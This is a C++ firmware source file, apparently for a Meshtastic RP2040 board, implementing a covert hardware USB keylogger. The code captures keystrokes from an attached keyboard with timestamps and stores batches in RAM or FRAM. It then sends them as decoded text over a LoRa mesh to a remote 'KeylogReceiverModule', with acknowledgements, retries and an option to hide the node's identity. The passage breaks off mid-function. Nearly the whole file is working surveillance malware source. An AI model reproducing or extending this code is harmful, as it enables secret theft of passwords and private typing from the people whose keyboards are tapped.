/**
 * @file USBCaptureModule.cpp
 * @brief USB keyboard capture module implementation with LoRa mesh transmission
 *
 * SPDX-License-Identifier: GPL-3.0-only
 *
 * ============================================================================
 * MESH TRANSMISSION - Direct Messages on Default Channel
 * ============================================================================
 *
 * When the keystroke buffer is finalized (full or flushed), it is automatically
 * transmitted as a direct message to a specific target node over the default channel.
 *
 * Channel Configuration:
 *   - Channel Index: 0 (default primary channel)
 *   - Uses standard Meshtastic encryption (default PSK or custom)
 *   - Port: TEXT_MESSAGE_APP (displays as text on receiving devices)
 *
 * Transmission Details (Direct Message Mode):
 *   - Auto-fragments if data exceeds MAX_PAYLOAD (~237 bytes)
 *   - Sends direct message to targetNode (auto-captured from first command sender)
 *   - Acknowledgment requested (want_ack = true) for reliable delivery
 *   - Target node captured when first STATUS/START/STOP/STATS command received
 *   - If no target set, transmission is skipped (send STATUS from receiver to set target)
 *
 * Function: sendToTargetNode(data, len)
 *   - Validates inputs, target node, and mesh service availability
 *   - Fragments data into LoRa-sized packets
 *   - Sends each fragment via service->sendToMesh() with RELIABLE priority
 *
 * ============================================================================
 * KEYSTROKE BUFFER FORMAT (500 bytes) - Delta Encoding
 * ============================================================================
 *
 * Layout:
 * ┌─────────────┬────────────────────────────────────────┬─────────────┐
 * │ Bytes 0-9   │           Bytes 10-489                 │ Bytes 490-499│
 * │ Start Epoch │     Keystroke Data (480 bytes)         │ Final Epoch │
 * └─────────────┴────────────────────────────────────────┴─────────────┘
 *
 * Epoch Format (Start/End):
 *   - 10 ASCII digits representing unix timestamp (e.g., "1733250000")
 *   - Start epoch: Written when buffer is initialized (first keystroke)
 *   - Final epoch: Written when buffer is finalized (full or flushed)
 *
 * Data Area Format:
 *   - Regular characters: 1 byte each (stored as-is)
 *   - Tab key: '\t' (1 byte)
 *   - Backspace: '\b' (1 byte)
 *   - Enter key: 0xFF marker + 2-byte delta = 3 bytes total
 *
 * Delta Encoding:
 *   - Enter key stores seconds elapsed since buffer start epoch
 *   - 2-byte big-endian format (0-65535 seconds = ~18 hours max)
 *   - Prefixed with 0xFF marker byte for identification
 *   - Buffer auto-finalizes if delta exceeds 65000 seconds
 *
 * Example Buffer Content:
 *   [1733250000][hello world][0xFF 0x00 0x05][second line][0xFF 0x00 0x0A][more][1733250099]
 *    └─start──┘              └─delta +5s──┘              └─delta +10s──┘       └─final───┘
 *
 * To Decode Enter Timestamp:
 *   enter_epoch = start_epoch + delta
 *   Example: 1733250000 + 5 = 1733250005
 *
 * Space Savings:
 *   - Old: 10 bytes per Enter (full epoch)
 *   - New: 3 bytes per Enter (marker + delta)
 *   - Savings: 7 bytes per Enter key (70% reduction)
 *
 * ============================================================================
 */

#include "USBCaptureModule.h"

#ifdef XIAO_USB_CAPTURE_ENABLED

#include "../platform/rp2xx0/usb_capture/usb_capture_main.h"
#include "../platform/rp2xx0/usb_capture/psram_buffer.h"
#include "../platform/rp2xx0/usb_capture/keyboard_decoder_core1.h"  /* For keyboard_decoder_core1_inject_text() */
#include "configuration.h"
#include "pico/multicore.h"
#include "gps/RTC.h"  /* For getRTCQuality(), RtcName() - v4.0 RTC logging */
#include "NodeDB.h"  /* For owner global (node name and role) */
#include <Arduino.h>
#include <cstring>

/* Mesh includes for private channel transmission */
#include "MeshService.h"
#include "Router.h"
#include "mesh-pb-constants.h"

/* Channel index for direct messages (0 = default primary channel) */
#define DM_CHANNEL_INDEX 0

USBCaptureModule *usbCaptureModule;

#ifdef HAS_FRAM_STORAGE
FRAMBatchStorage *framStorage = nullptr;
#endif

/* Global queues for inter-core communication */
static keystroke_queue_t g_keystroke_queue;
static formatted_event_queue_t g_formatted_queue;

USBCaptureModule::USBCaptureModule()
    : SinglePortModule("USBCapture", meshtastic_PortNum_TEXT_MESSAGE_APP),
      concurrency::OSThread("USBCapture")
{
    keystroke_queue = &g_keystroke_queue;
    formatted_queue = &g_formatted_queue;
    core1_started = false;
    capture_enabled = true;  // Enabled by default
    /* Client identification now uses owner.long_name and owner.role (no local storage) */
}

bool USBCaptureModule::init()
{
    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());

    /* Log node identity (from Meshtastic owner config) */
    const char *role_str = (owner.role == meshtastic_Config_DeviceConfig_Role_CLIENT_HIDDEN) ? "HIDDEN" : "CLIENT";
    LOG_INFO("[USBCapture] Node: %s | Role: %s", owner.long_name, role_str);

    /* Initialize keystroke queue */
    keystroke_queue_init(keystroke_queue);

    /* Initialize formatted event queue */
    formatted_queue_init(formatted_queue);

#ifdef HAS_FRAM_STORAGE
    /* Initialize FRAM storage for non-volatile keystroke batches */
    LOG_INFO("[USBCapture] Initializing FRAM storage on SPI0, CS=GPIO%d", FRAM_CS_PIN);
    framStorage = new FRAMBatchStorage(FRAM_CS_PIN, &SPI, FRAM_SPI_FREQ);

    if (!framStorage->begin()) {
        LOG_ERROR("[USBCapture] FRAM: Failed to initialize - falling back to RAM buffer");
        delete framStorage;
        framStorage = nullptr;
        /* Initialize RAM buffer as fallback */
        psram_buffer_init();
    } else {
        /* FRAM initialized successfully */
        uint8_t manufacturerID = 0;
        uint16_t productID = 0;
        framStorage->getDeviceID(&manufacturerID, &productID);
        LOG_INFO("[USBCapture] FRAM: Initialized (Mfr=0x%02X, Prod=0x%04X)", manufacturerID, productID);
        LOG_INFO("[USBCapture] FRAM: %u batches pending, %lu bytes free",
                 framStorage->getBatchCount(), framStorage->getAvailableSpace());
    }
#else
    /* No FRAM - use RAM buffer */
    psram_buffer_init();
#endif

    /* Initialize capture controller */
    capture_controller_init_v2(&controller, keystroke_queue, formatted_queue);

    /* Set capture speed - default to LOW speed (1.5 Mbps) */
    /* Change to CAPTURE_SPEED_FULL for full speed USB (12 Mbps) */
    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);

    /* Core1 will be launched on first runOnce() call */
    LOG_INFO("USB Capture Module initialized (Core1 will start in main loop)");

#ifdef USB_CAPTURE_SIMULATE_KEYS
    LOG_WARN("[USBCapture] *** SIMULATION MODE ENABLED ***");
    LOG_WARN("[USBCapture] Will generate %d test batches every %d ms",
             SIM_BATCH_COUNT, SIM_INTERVAL_MS);
    LOG_WARN("[USBCapture] No USB keyboard required - testing pipeline only");
#endif

    return true;
}

int32_t USBCaptureModule::runOnce()
{
    /* Launch Core1 on first run (completely non-blocking) */
    if (!core1_started)
    {
        LOG_INFO("Launching Core1 for USB capture (independent operation)...");
        LOG_DEBUG("Core1 launch: queue=%p, controller initialized", (void*)keystroke_queue);

        /* Check if Core1 is already running (safety check) */
        if (multicore_fifo_rvalid())
        {
            LOG_WARN("FIFO has data before Core1 launch - draining...");
            multicore_fifo_drain();
        }

        LOG_DEBUG("About to call multicore_launch_core1()...");

        /* Try to reset Core1 first in case it's in a bad state */
        multicore_reset_core1();
        LOG_DEBUG("Core1 reset complete");

        /* Use busy-wait instead of delay() to avoid scheduler issues */
        uint32_t start = millis();
        while (millis() - start < CORE1_LAUNCH_DELAY_MS)
        {
            tight_loop_contents();
        }

        LOG_DEBUG("Launching Core1 now...");

        /* Core1 will auto-start capture when launched - no commands needed */
        multicore_launch_core1(capture_controller_core1_main_v2);

        LOG_DEBUG("multicore_launch_core1() returned successfully");
        core1_started = true;

        LOG_INFO("Core1 launched and running independently");
    }

    /* v6.0: Check for ACK timeout before processing new batches
     * This handles retries with exponential backoff */
    checkPendingTimeout();

#ifdef USB_CAPTURE_SIMULATE_KEYS
    /* v6.1: Simulation mode - generate fake keystroke batches for testing
     * This bypasses Core1/PIO and writes directly to FRAM */
    if (sim_enabled && capture_enabled) {
        simulateKeystrokes();
    }
#endif

    /* Poll PSRAM/FRAM for completed buffers from Core1 */
    processPSRAMBuffers();

    /* Note: Formatted event logging now happens directly on Core1 */

    /* Poll every 20 seconds to reduce overhead */
    return RUNONCE_INTERVAL_MS;
}

/**
 * @brief Decode binary keystroke buffer into human-readable text
 *
 * Converts raw buffer data (with delta encoding) into plain text that
 * can be displayed on receiving devices' phone apps.
 *
 * @param buffer Source buffer with binary keystroke data
 * @param output Destination buffer for decoded text
 * @param max_len Maximum output buffer size
 * @return Length of decoded text
 */
size_t USBCaptureModule::decodeBufferToText(const psram_keystroke_buffer_t *buffer,
                                            char *output, size_t max_len)
{
    size_t out_pos = 0;

    /* Add node name prefix UNLESS role is CLIENT_HIDDEN */
    if (owner.role != meshtastic_Config_DeviceConfig_Role_CLIENT_HIDDEN &&
        owner.long_name[0] != '\0') {
        out_pos += snprintf(output + out_pos, max_len - out_pos,
                           "[%s] ", owner.long_name);
    }

    /* Add header with timestamp */
    out_pos += snprintf(output + out_pos, max_len - out_pos,
                       "[%u→%u] ", buffer->start_epoch, buffer->final_epoch);

    /* Decode keystroke data */
    for (size_t i = 0; i < buffer->data_length && out_pos < max_len - 1; i++)
    {
        unsigned char c = (unsigned char)buffer->data[i];

        /* Check for delta marker (Enter key with timestamp) */
        if (c == 0xFF && (i + 2) < buffer->data_length)
        {
            /* Read 2-byte delta */
            uint16_t delta = ((unsigned char)buffer->data[i + 1] << 8) |
                             (unsigned char)buffer->data[i + 2];

            /* Add newline for Enter key */
            if (out_pos < max_len - 1) {
                output[out_pos++] = '\n';
            }

            i += 2; /* Skip delta bytes */
            continue;
        }

        /* Copy regular characters */
        if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX) {
            output[out_pos++] = c;
        } else if (c == '\t' && out_pos < max_len - 1) {
            output[out_pos++] = '\t';
        } else if (c == '\b' && out_pos < max_len - 1) {
            output[out_pos++] = '\b';
        }
    }

    output[out_pos] = '\0';
    return out_pos;
}

/**
 * @brief Process PSRAM buffers and transmit them (Core0 operation)
 *
 * Core0's primary responsibility for keystroke transmission. Polls the PSRAM
 * ring buffer for complete keystroke buffers written by Core1 and transmits them.
 *
 * Processing Flow:
 *  1. Check if PSRAM has data (psram_buffer_read)
 *  2. Read complete buffer (already formatted by Core1)
 *  3. Decode binary buffer to human-readable text
 *  4. Log buffer content with decoded timestamps
 *  5. Transmit decoded text (rate-limited to prevent mesh flooding)
 *  6. Repeat while buffers available
 *  7. Log statistics every 10 seconds
 *
 * Performance:
 *  - Ultra-lightweight: Just memcpy + decode + transmit
 *  - No formatting overhead (done by Core1)
 *  - No buffer management (done by Core1)
 *  - Estimated CPU: ~0.2% (vs 2% before)
 *
 * @note Called every 100ms from runOnce()
 * @note Rate-limited to 1 transmission per 6 seconds to prevent mesh flooding
 * @note Statistics: available, total_transmitted, dropped_buffers
 */
void USBCaptureModule::processPSRAMBuffers()
{
    psram_keystroke_buffer_t buffer;
    static uint32_t last_transmit_time = 0;
    bool have_data = false;

    /* Skip processing if capture is disabled */
    if (!capture_enabled) {
        return;
    }

    /* NASA Rule 5: Check pending state before processing
     * Skip if we're waiting for ACK on a previous batch */
    if (pendingTx.batch_id != 0) {
        LOG_DEBUG("[USBCapture] Waiting for ACK on batch 0x%08x (elapsed %u ms)",
                  pendingTx.batch_id, millis() - pendingTx.send_time);
        return;
    }

#ifdef HAS_FRAM_STORAGE
    /* Try to read from FRAM storage if available */
    if (framStorage != nullptr && framStorage->isInitialized()) {
        uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
        uint16_t actualLength = 0;

        if (framStorage->readBatch(fram_batch, sizeof(fram_batch), &actualLength)) {
            /* Unpack FRAM batch format into psram_keystroke_buffer_t
             * FRAM format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N]
             * Total header: 12 bytes + data */
            if (actualLength >= 12) {
                memcpy(&buffer.start_epoch, &fram_batch[0], 4);
                memcpy(&buffer.final_epoch, &fram_batch[4], 4);
                memcpy(&buffer.data_length, &fram_batch[8], 2);
                memcpy(&buffer.flags, &fram_batch[10], 2);

                /* Copy keystroke data */
                uint16_t data_len = actualLength - 12;
                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                    data_len = PSRAM_BUFFER_DATA_SIZE;  /* Truncate if too large */
                }
                memcpy(buffer.data, &fram_batch[12], data_len);
                buffer.data_length = data_len;

                have_data = true;
            }
            /* Note: We'll delete the batch after successful transmission */
        }
    } else {
        /* Fall back to RAM buffer */
        have_data = psram_buffer_read(&buffer);
    }
#else
    /* No FRAM - use RAM buffer */
    have_data = psram_buffer_read(&buffer);
#endif

    /* Process only ONE buffer per call to avoid flooding */
    if (have_data)
    {
        /* Get RTC quality for logging (v4.0) */
        RTCQuality rtc_quality = getRTCQuality();
        const char *time_source = RtcName(rtc_quality);

        LOG_INFO("[Core0] Transmitting buffer: %u bytes (epoch %u → %u)",
                buffer.data_length, buffer.start_epoch, buffer.final_epoch);
        LOG_INFO("[Core0] Time source: %s (quality=%d)", time_source, rtc_quality);

        /* Log buffer content for debugging */
        LOG_INFO("=== BUFFER START ===");
        if (rtc_quality >= RTCQualityFromNet) {
            LOG_INFO("Start Time: %u (unix epoch from %s)", buffer.start_epoch, time_source);
        } else {
#ifdef BUILD_EPOCH
            LOG_INFO("Start Time: %u (BUILD_EPOCH + uptime: %u + %u)",
                    buffer.start_epoch, (uint32_t)BUILD_EPOCH,
                    buffer.start_epoch - (uint32_t)BUILD_EPOCH);
#else
            LOG_INFO("Start Time: %u seconds (uptime since boot)", buffer.start_epoch);
#endif
        }

        /* Log data in chunks to avoid line length issues */
        char line_buffer[MAX_LINE_BUFFER_SIZE];
        size_t line_pos = 0;

        for (size_t i = 0; i < buffer.data_length; i++)
        {
            unsigned char c = (unsigned char)buffer.data[i];

            /* Check for delta marker (0xFF followed by 2 bytes) */
            if (c == 0xFF && (i + 2) < buffer.data_length)
            {
                /* Output current line if we have content */
                if (line_pos > 0)
                {
                    line_buffer[line_pos] = '\0';
                    LOG_INFO("Line: %s", line_buffer);
                    line_pos = 0;
                }

                /* Read 2-byte delta (big-endian) */
                uint16_t delta = ((unsigned char)buffer.data[i + 1] << 8) |
                                 (unsigned char)buffer.data[i + 2];

                /* Calculate full timestamp from start + delta */
                uint32_t enter_time = buffer.start_epoch + delta;

                LOG_INFO("Enter [time=%u seconds, delta=+%u]", enter_time, delta);
                i += 2; /* Skip delta bytes */
                continue;
            }

            /* Add character to current line */
            if (c == '\t')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 't';
                }
            }
            else if (c == '\b')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 'b';
                }
            }
            else if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX)
            {
                if (line_pos < sizeof(line_buffer) - 1)
                {
                    line_buffer[line_pos++] = c;
                }
            }
        }

        /* Output any remaining content */
        if (line_pos > 0)
        {
            line_buffer[line_pos] = '\0';
            LOG_INFO("Line: %s", line_buffer);
        }

        LOG_INFO("Final Time: %u seconds (uptime since boot)", buffer.final_epoch);
        LOG_INFO("=== BUFFER END ===");

        /* Decode buffer to human-readable text */
        /* TODO: Future FRAM implementation - transmit binary encrypted data instead of decoded text
         *       Once FRAM storage is implemented, we should:
         *       1. Keep binary buffer format for efficient storage
         *       2. Encrypt binary data before transmission
         *       3. Receiving nodes decrypt and decode on their end
         *       For now, decode to text so phone apps can display it */
        char decoded_text[MAX_DECODED_TEXT_SIZE];
        size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));

        /* Rate limiting: Only transmit if enough time has passed
         * Note: With ACK tracking, we only send one batch at a time anyway */
        uint32_t now = millis();
        if (now - last_transmit_time >= MIN_TRANSMIT_INTERVAL_MS)
        {
            /* Generate batch ID for ACK correlation (v6.0)
             * NASA Rule 6: Variable scoped to smallest level */
            uint32_t batchId = nextBatchId++;

            /* Attempt transmission with batch header */
            uint32_t packetId = sendToTargetNode((const uint8_t *)decoded_text, text_len, batchId);

            if (packetId != 0)
            {
                /* Transmission queued - set up pending state for ACK tracking
                 * NASA Rule 5: Assertions for postconditions */
                assert(pendingTx.batch_id == 0);  /* Should be clear at this point */

                pendingTx.batch_id = batchId;
                pendingTx.packet_id = packetId;
                pendingTx.send_time = now;
                pendingTx.timeout_ms = ACK_TIMEOUT_INITIAL_MS;
                pendingTx.retry_count = 0;

                last_transmit_time = now;

                LOG_INFO("[USBCapture] Batch 0x%08x queued, awaiting ACK (timeout %u ms)",
                         batchId, pendingTx.timeout_ms);

                /* NOTE: Batch is NOT deleted from FRAM here!
                 * v6.2: Deletion happens ONLY when ACK is received (handleAckResponse)
                 * Failed batches stay in FRAM forever and retry on next cycle */
            }
            else
            {
                /* Transmission failed immediately (no target, service unavailable, etc.)
                 * Track in statistics but don't set pending state
                 * v6.2: Batch stays in FRAM - will retry on next runOnce() cycle */
                __dmb();
                g_psram_buffer.header.transmission_failures++;
                __dmb();
                LOG_WARN("[USBCapture] Transmission failed for batch 0x%08x - will retry next cycle", batchId);
            }
        }
        else
        {
            /* Rate limit active - batch stays in FRAM, will retry next cycle
             * With FRAM persistence, this is safe - no data loss */
            LOG_DEBUG("[USBCapture] Rate limit: wait %u ms before next transmission",
                     MIN_TRANSMIT_INTERVAL_MS - (now - last_transmit_time));
        }
    }

    /* Log statistics periodically */
    static uint32_t last_stats_time = 0;
    uint32_t stats_now = millis();
    if (stats_now - last_stats_time > STATS_LOG_INTERVAL_MS)
    {
        /* Declare statistics variables outside ifdef for use in warnings */
        uint32_t tx_failures = 0;
        uint32_t overflows = 0;
        uint32_t psram_failures = 0;

#ifdef HAS_FRAM_STORAGE
        /* Use FRAM statistics if available */
        if (framStorage != nullptr && framStorage->isInitialized()) {
            uint8_t available = framStorage->getBatchCount();
            uint32_t free_space = framStorage->getAvailableSpace();
            LOG_INFO("[Core0] FRAM: %u batches pending, %lu bytes free", available, free_space);

            /* Get failure stats from RAM buffer header even when using FRAM */
            __dmb();
            tx_failures = g_psram_buffer.header.transmission_failures;
            overflows = g_psram_buffer.header.buffer_overflows;
            psram_failures = g_psram_buffer.header.psram_write_failures;
            __dmb();
        } else
#endif
        {
            /* Read RAM buffer statistics with memory barrier */
            __dmb();
            uint32_t available = psram_buffer_get_count();
            uint32_t transmitted = g_psram_buffer.header.total_transmitted;
            uint32_t dropped = g_psram_buffer.header.dropped_buffers;
            tx_failures = g_psram_buffer.header.transmission_failures;
            overflows = g_psram_buffer.header.buffer_overflows;
            psram_failures = g_psram_buffer.header.psram_write_failures;
            uint32_t retries = g_psram_buffer.header.retry_attempts;
            __dmb();

            LOG_INFO("[Core0] PSRAM: %u avail, %u tx, %u drop | Failures: %u tx, %u overflow, %u psram | Retries: %u",
                    available, transmitted, dropped, tx_failures, overflows, psram_failures, retries);
        }

        /* Get current RTC quality and time for monitoring (v4.0) */
        RTCQuality current_quality = getRTCQuality();
        uint32_t meshtastic_time = getTime(false);  // Meshtastic RTC system time
        uint32_t uptime = (uint32_t)(millis() / 1000);
        const char *quality_name = RtcName(current_quality);

        /* Calculate what Core1 is actually using for timestamps */
        uint32_t core1_time;
        const char *time_source_desc;
        if (current_quality >= RTCQualityFromNet) {
            core1_time = meshtastic_time;
            time_source_desc = "RTC";
        } else {
#ifdef BUILD_EPOCH
            core1_time = BUILD_EPOCH + uptime;
            time_source_desc = "BUILD_EPOCH+uptime";
#else
            core1_time = uptime;
            time_source_desc = "uptime";
#endif
        }

        LOG_INFO("[Core0] Time: %s=%u (%s quality=%d) | uptime=%u",
                time_source_desc, core1_time, quality_name, current_quality, uptime);

        /* Log warnings for critical failures */
        if (tx_failures > 0)
        {
            LOG_WARN("[Core0] WARNING: %u transmission failures detected - check mesh connectivity", tx_failures);
        }
        if (overflows > 0)
        {
            LOG_WARN("[Core0] INFO: %u buffer overflows (emergency finalized - data preserved)", overflows);
        }
        if (psram_failures > 0)
        {
            LOG_ERROR("[Core0] CRITICAL: %u PSRAM write failures - Core0 too slow to transmit", psram_failures);
        }

        last_stats_time = stats_now;
    }
}

/* processFormattedEvents() removed - Core1 now logs directly instead of queuing events */

/* formatKeystrokeEvent() removed - formatting now done on Core1 */

/* ============================================================================
 * BUFFER MANAGEMENT FUNCTIONS REMOVED
 * ============================================================================
 * All buffer management functions (writeEpochAt, writeDeltaAt, initKeystrokeBuffer,
 * getBufferSpace, addToBuffer, addEnterToBuffer, finalizeBuffer) have been moved
 * to Core1 (keyboard_decoder_core1.cpp).
 *
 * Core0 now only reads complete buffers from PSRAM and transmits them.
 * This reduces Core0 overhead by ~90% (2% → 0.2%).
 */

/**
 * @brief Send buffer data with batch header to target node
 *
 * Protocol format: [batch_id:4][start_epoch:4][final_epoch:4][data:N]
 * Uses PRIVATE_APP port for keystroke data (not visible in standard chat).
 *
 * NASA Power of 10 compliance:
 * - Fixed buffer size (no dynamic allocation)
 * - All pointer dereferences checked
 * - Loop has fixed upper bound (MAX_FRAGMENTS)
 * - Return value always meaningful
 *
 * @param data Pointer to keystroke data (decoded text)
 * @param len Length of data
 * @param batchId Unique batch ID for ACK correlation
 * @return Packet ID if successful, 0 if failed
 */
uint32_t USBCaptureModule::sendToTargetNode(const uint8_t *data, size_t len, uint32_t batchId)
{
    /* NASA Rule 5: Assertions for preconditions */
    assert(len <= MAX_DECODED_TEXT_SIZE);

    /* Validate inputs */
    if (!data || len == 0) {
        LOG_WARN("[USBCapture] sendToTargetNode: invalid data or length");
        return 0;
    }

    /* Check if target node is set (DM-only mode) */
    if (targetNode == 0) {
        LOG_DEBUG("[USBCapture] No target node set - skipping transmission");
        return 0;
    }

    /* Check if mesh service is available */
    if (!service || !router) {
        LOG_WARN("[USBCapture] sendToTargetNode: mesh service not available");
        return 0;
    }

    /* Build packet with batch header
     * Format: [batch_id:4][data:N]
     * Note: start/final epochs are already in the decoded text prefix */
    const size_t HEADER_SIZE = 4;  /* batch_id only */
    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;

    /* NASA Rule 3: Fixed size buffer, no dynamic allocation */
    uint8_t packet_buffer[MAX_PAYLOAD];

    /* Pack batch header (little-endian for ARM) */
    memcpy(&packet_buffer[0], &batchId, 4);

    /* Calculate data that fits in first packet */
    size_t data_in_first = (len > MAX_PAYLOAD - HEADER_SIZE) ?
                           (MAX_PAYLOAD - HEADER_SIZE) : len;

    /* Copy keystroke data after header */
    memcpy(&packet_buffer[HEADER_SIZE], data, data_in_first);

    /* Allocate packet from router pool */
    meshtastic_MeshPacket *p = router->allocForSending();
    if (!p) {
        LOG_ERROR("[USBCapture] sendToTargetNode: failed to allocate packet");
        return 0;
    }

    /* Capture packet ID for ACK tracking (before send modifies it) */
    uint32_t sentPacketId = p->id;

    /* Configure packet for direct message to target node */
    p->to = targetNode;
    p->channel = DM_CHANNEL_INDEX;
    p->want_ack = true;
    p->priority = meshtastic_MeshPacket_Priority_RELIABLE;

    /* Use PRIVATE_APP port - KeylogReceiverModule on Heltec listens here */
    p->decoded.portnum = meshtastic_PortNum_PRIVATE_APP;

    /* Copy payload (header + data) */
    p->decoded.payload.size = HEADER_SIZE + data_in_first;
    memcpy(p->decoded.payload.bytes, packet_buffer, p->decoded.payload.size);

    /* Send to mesh */
    service->sendToMesh(p, RX_SRC_LOCAL, false);

    LOG_INFO("[USBCapture] Sent batch 0x%08x (%zu bytes) → 0x%08x, packet_id=0x%08x",
             batchId, HEADER_SIZE + data_in_first, targetNode, sentPacketId);

    /* For now, we only support single-packet batches (237 bytes max after header)
     * TODO: If fragmentation needed, track all packet IDs and wait for all ACKs */
    if (len > data_in_first) {
        LOG_WARN("[USBCapture] Data truncated: %zu bytes sent of %zu total", data_in_first, len);
    }

    return sentPacketId;
}

// ============================================================================
// ACK TRACKING IMPLEMENTATION (v6.0)
// ============================================================================

/**
 * @brief Check for ACK timeout and handle retry/failure
 *
 * Called from runOnce() before processing new batches.
 * Implements exponential backoff: 30s -> 60s -> 120s (capped at ACK_MAX_TIMEOUT_MS).
 *
 * NASA Power of 10 compliance:
 * - Fixed loop bound (max ACK_MAX_RETRIES iterations over time)
 * - No dynamic memory allocation
 * - All return paths explicit
 */
void USBCaptureModule::checkPendingTimeout()
{
    /* No pending transmission - nothing to check */
    if (pendingTx.batch_id == 0) {
        return;
    }

    uint32_t elapsed = millis() - pendingTx.send_time;

    /* Check if timeout expired */
    if (elapsed < pendingTx.timeout_ms) {
        return;  /* Still waiting, not timed out yet */
    }

    /* Timeout occurred */
    LOG_WARN("[USBCapture] ACK timeout for batch 0x%08x after %u ms (retry %u/%u)",
             pendingTx.batch_id, elapsed, pendingTx.retry_count + 1, ACK_MAX_RETRIES);

    /* Check if we have retries remaining */
    if (pendingTx.retry_count < ACK_MAX_RETRIES) {
        /* Attempt resend with exponential backoff */
        if (resendPendingBatch()) {
            /* Update tracking for next timeout check */
            pendingTx.send_time = millis();

            /* Double timeout (with cap) - NASA Rule 2: bounded values */
            uint32_t new_timeout = pendingTx.timeout_ms * ACK_BACKOFF_MULTIPLIER;
            if (new_timeout > ACK_MAX_TIMEOUT_MS) {
                new_timeout = ACK_MAX_TIMEOUT_MS;
            }
            pendingTx.timeout_ms = new_timeout;
            pendingTx.retry_count++;

            /* Track statistics */
            ack_retry_count++;

            LOG_INFO("[USBCapture] Resent batch 0x%08x, next timeout %u ms",
                     pendingTx.batch_id, pendingTx.timeout_ms);
        } else {
            /* Resend failed - treat as max retries reached */
            LOG_ERROR("[USBCapture] Resend failed for batch 0x%08x", pendingTx.batch_id);
            pendingTx.retry_count = ACK_MAX_RETRIES;  /* Force failure path */
        }
    }

    /* Check if max retries exceeded (may have been set above) */
    if (pendingTx.retry_count >= ACK_MAX_RETRIES) {
        /* v6.2: DON'T delete batch on failure - keep in FRAM and retry later
         * Batch will be retried on next runOnce() cycle (every 20 seconds)
         * This ensures we never lose keystroke data due to temporary network issues */
        LOG_WARN("[USBCapture] Batch 0x%08x failed after %u retries - keeping in FRAM, will retry next cycle",
                  pendingTx.batch_id, ACK_MAX_RETRIES);

        /* Track failure statistics */
        ack_timeout_count++;

        /* Clear pending state - next runOnce() will read from FRAM and try again
         * Reset retry count so we get fresh exponential backoff on next attempt */
        pendingTx.batch_id = 0;
        pendingTx.packet_id = 0;
        pendingTx.retry_count = 0;
        pendingTx.timeout_ms = ACK_TIMEOUT_INITIAL_MS;
    }
}

/**
 * @brief Resend the pending batch after timeout
 *
 * Re-reads batch from FRAM (it wasn't deleted) and retransmits with a new packet ID.
 * The batch_id remains the same for ACK correlation.
 *
 * NASA Power of 10 compliance:
 * - Fixed buffer sizes
 * - All return values checked
 * - Explicit error handling
 *
 * @return true if resend successful, false if error
 */
bool USBCaptureModule::resendPendingBatch()
{
    /* NASA Rule 5: Precondition check */
    assert(pendingTx.batch_id != 0);

    psram_keystroke_buffer_t buffer;
    bool have_data = false;

#ifdef HAS_FRAM_STORAGE
    /* Re-read batch from FRAM (it's still there since we didn't delete it) */
    if (framStorage != nullptr && framStorage->isInitialized()) {
        uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
        uint16_t actualLength = 0;

        if (framStorage->readBatch(fram_batch, sizeof(fram_batch), &actualLength)) {
            /* Unpack FRAM format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N] */
            if (actualLength >= 12) {
                memcpy(&buffer.start_epoch, &fram_batch[0], 4);
                memcpy(&buffer.final_epoch, &fram_batch[4], 4);
                memcpy(&buffer.data_length, &fram_batch[8], 2);
                memcpy(&buffer.flags, &fram_batch[10], 2);

                uint16_t data_len = actualLength - 12;
                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                    data_len = PSRAM_BUFFER_DATA_SIZE;  /* NASA Rule 2: bounded */
                }
                memcpy(buffer.data, &fram_batch[12], data_len);
                buffer.data_length = data_len;

                have_data = true;
            }
        }
    }
#endif

    if (!have_data) {
        LOG_ERROR("[USBCapture] resendPendingBatch: failed to read batch from FRAM");
        return false;
    }

    /* Decode buffer to text (same as initial send) */
    char decoded_text[MAX_DECODED_TEXT_SIZE];
    size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));

    /* Send with same batch_id for ACK correlation */
    uint32_t newPacketId = sendToTargetNode((const uint8_t *)decoded_text, text_len, pendingTx.batch_id);

    if (newPacketId != 0) {
        /* Update packet ID for new transmission */
        pendingTx.packet_id = newPacketId;
        LOG_INFO("[USBCapture] Resent batch 0x%08x as packet 0x%08x",
                 pendingTx.batch_id, newPacketId);
        return true;
    }

    LOG_ERROR("[USBCapture] resendPendingBatch: sendToTargetNode failed");
    return false;
}

/**
 * @brief Handle incoming ACK response for pending transmission
 *
 * Parses "ACK:0x<batch_id>" format from Heltec KeylogReceiverModule.
 * Deletes FRAM batch only after successful ACK match.
 *
 * NASA Power of 10 compliance:
 * - Fixed size buffers for parsing
 * - Bounds checking on all string operations
 * - Explicit error handling
 *
 * @param mp The received mesh packet (should be PRIVATE_APP port)
 * @return true if this was a valid ACK for our pending batch
 */
bool USBCaptureModule::handleAckResponse(const meshtastic_MeshPacket &mp)
{
    /* Check if we're even waiting for an ACK */
    if (pendingTx.batch_id == 0) {
        return false;
    }

    /* Validate payload exists */
    if (mp.decoded.payload.size == 0) {
        return false;
    }

    /* ACK format: "ACK:0x<8 hex digits>"
     * Example: "ACK:0x12345678" (14 characters) */
    const size_t ACK_MIN_LEN = 6;   /* "ACK:0x" minimum */
    const size_t ACK_FULL_LEN = 14; /* "ACK:0x12345678" */

    if (mp.decoded.payload.size < ACK_MIN_LEN) {
        return false;
    }

    /* Check ACK prefix (case-insensitive) */
    const char *payload = (const char *)mp.decoded.payload.bytes;

    /* NASA Rule 2: Bounded comparison */
    if (strncmp(payload, "ACK:0x", 6) != 0 &&
        strncmp(payload, "ack:0x", 6) != 0 &&
        strncmp(payload, "ACK:0X", 6) != 0) {
        return false;  /* Not an ACK packet */
    }

    /* Parse batch ID from hex string */
